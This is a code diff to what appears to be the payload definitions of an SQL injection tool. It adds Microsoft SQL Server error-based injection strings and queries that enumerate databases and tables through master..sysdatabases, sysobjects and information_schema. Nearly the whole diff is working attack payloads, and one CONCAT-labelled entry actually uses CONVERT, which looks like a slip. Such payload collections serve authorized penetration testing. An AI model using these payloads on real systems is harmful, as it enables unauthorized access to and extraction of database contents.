@@ -66,6 +66,7 @@ PAYLOADS_CURRENT_USER = [
     "CURRENT_USER()",
     "SESSION_USER()",
     "SYSTEM_USER()",
+    "USER_NAME()",
 ]
 
 PAYLOADS_CURRENT_DATABASE = [
@@ -76,11 +77,11 @@ PAYLOADS_CURRENT_DATABASE = [
     "DATABASE/*!50000()*/",
     "CURRENT_SCHEMA()",
     "DB_NAME()",
-    "@@DB_NAME"
 ]
 
 PAYLOADS_HOSTNAME = [
     "@@HOSTNAME",
+    "HOST_NAME()",
     "(SELECT+CONCAT(boot_val)+FROM+pg_settings WHERE name='listen_addresses' GROUP BY boot_val)",
 ]
 
@@ -267,12 +268,43 @@ PAYLOADS = [
         "version": "",
         "order": 17,
         "regex": REGEX_GENERIC,
+        "title": "Microsoft SQL Server/Sybase AND/OR error-based - WHERE or HAVING clause",
+        "payloads": [
+            "AND 3082=(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
+            "OR 3082=(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
+        ],
+    },
+    {
+        "back_end": "Microsoft SQL Server",
+        "version": "",
+        "order": 18,
+        "regex": REGEX_GENERIC,
         "title": "Microsoft SQL Server/Sybase AND/OR error-based - WHERE or HAVING clause (IN)",
         "payloads": [
             "AND 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
             "OR 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
-            "AND 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (CHAR(49)%2BCHAR(51)%2BCHAR(51)%2BCHAR(55)))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
-            "OR 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (CHAR(49)%2BCHAR(51)%2BCHAR(51)%2BCHAR(55)) )%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))"
+        ],
+    },
+    {
+        "back_end": "Microsoft SQL Server",
+        "version": "",
+        "order": 18,
+        "regex": REGEX_GENERIC,
+        "title": "Microsoft SQL Server/Sybase AND/OR error-based - WHERE or HAVING clause (CONVERT)",
+        "payloads": [
+            "AND 3082=CONVERT(INT,(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68))))",
+            "OR 3082=CONVERT(INT,(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68))))",
+        ],
+    },
+    {
+        "back_end": "Microsoft SQL Server",
+        "version": "",
+        "order": 18,
+        "regex": REGEX_GENERIC,
+        "title": "Microsoft SQL Server/Sybase AND/OR error-based - WHERE or HAVING clause (CONCAT)",
+        "payloads": [
+            "AND 3082=CONCAT(CHAR(126),(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68))))",
+            "AND 3082=CONVERT(CHAR(126),(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68))))",
         ],
     },
 ]
@@ -290,6 +322,11 @@ PAYLOADS_DBS_COUNT = {
         "(SELECT+ARRAY_TO_STRING(ARRAY(SELECT COUNT(SCHEMANAME)::text+FROM pg_tables GROUP BY SCHEMANAME),(CHR(83)||CHR(51)||CHR(80)||CHR(82)||CHR(52)||CHR(84)||CHR(48)||CHR(82))))",
         "(SELECT/**/ARRAY_TO_STRING(ARRAY(SELECT/**/COUNT(TABLE_SCHEMA)::text/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/GROUP/**/BY/**/TABLE_SCHEMA),(CHR(83)||CHR(51)||CHR(80)||CHR(82)||CHR(52)||CHR(84)||CHR(48)||CHR(82))))",
     ],
+    "Microsoft SQL Server": [
+        "(SELECT COUNT(name) FROM master..sysdatabases)",
+        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM master..sysdatabases)",
+        "(SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases)",
+    ],
 }
 
 
@@ -305,6 +342,12 @@ PAYLOADS_DBS_NAMES = {
         "(SELECT+CONCAT(SCHEMANAME)::text+FROM pg_tables GROUP BY SCHEMANAME OFFSET 0 LIMIT 1)",
         "(SELECT TABLE_SCHEMA::text+FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1)",
         "(SELECT CONCAT(TABLE_SCHEMA)::text+FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1)",
+    ],
+    "Microsoft SQL Server": [
+        "(SELECT DB_NAME(0))",
+        "(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases ORDER BY name) ORDER BY name)",
+        "(SELECT TOP 1 CAST(name AS NVARCHAR(4000)) FROM master..sysdatabases WHERE CAST(name AS NVARCHAR(4000)) NOT IN (SELECT TOP 0 CAST(name AS NVARCHAR(4000)) FROM master..sysdatabases ORDER BY name) ORDER BY name)",
+        "(SELECT TOP 1 SUBSTRING((ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))),1,1024) FROM master..sysdatabases WHERE ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 3 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases ORDER BY name) ORDER BY name)",
     ],
 }
 
@@ -325,6 +368,14 @@ PAYLOADS_TBLS_COUNT = {
         "(SELECT COUNT(TABLE_NAME)::text+FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={db})",
         "(SELECT COUNT(TABLE_NAME)::text+FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE {db})",
     ],
+    "Microsoft SQL Server": [
+        "(SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype=CHAR(85))",
+        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..sysobjects WHERE xtype=CHAR(85))",
+        "(SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)))",
+        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)))",
+        "(SELECT COUNT(TABLE_NAME) FROM information_schema.tables WHERE table_catalog={db})",
+        "(SELECT CAST(COUNT(TABLE_NAME) AS NVARCHAR(4000)) FROM information_schema.tables WHERE table_catalog={db})",
+    ],
 }
 
 PAYLOADS_TBLS_NAMES = {
@@ -342,6 +393,13 @@ PAYLOADS_TBLS_NAMES = {
         "(SELECT TABLE_NAME::text+FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={db} OFFSET 0 LIMIT 1)",
         "(SELECT TABLE_NAME::text+FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE {db} OFFSET 0 LIMIT 1)",
         "(SELECT TABLE_NAME::text+FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN({db}) OFFSET 0 LIMIT 1)",
+    ],
+    "Microsoft SQL Server": [
+        "(SELECT TOP 1 TABLE_NAME FROM information_schema.tables WHERE table_catalog={db} AND TABLE_NAME NOT IN (SELECT TOP 0 TABLE_NAME FROM information_schema.tables WHERE table_catalog={db1} ORDER BY table_name)ORDER BY table_name)",
+        "(SELECT TOP 1 CAST(TABLE_SCHEMA%2BCHAR(46)%2BTABLE_NAME AS NVARCHAR(4000)) FROM information_schema.tables WHERE table_catalog={db} AND TABLE_NAME NOT IN (SELECT TOP 0 CAST(TABLE_SCHEMA%2BCHAR(46)%2BTABLE_NAME AS NVARCHAR(4000)) FROM information_schema.tables WHERE table_catalog={db1}))",
+        "(SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype=CHAR(85) AND name NOT IN (SELECT TOP 0 name FROM {db1}..sysobjects WHERE xtype=CHAR(85) ORDER BY name) ORDER BY name)",
+        "(SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) AND name NOT IN (SELECT TOP 0 name FROM {db1}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) ORDER BY name) ORDER BY name)",
+        "(SELECT TOP 1 CAST(name AS NVARCHAR(4000)) FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) AND CAST(name AS NVARCHAR(4000)) NOT IN (SELECT TOP 0 name FROM {db1}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) ORDER BY name) ORDER BY name)",
     ],
 }
 
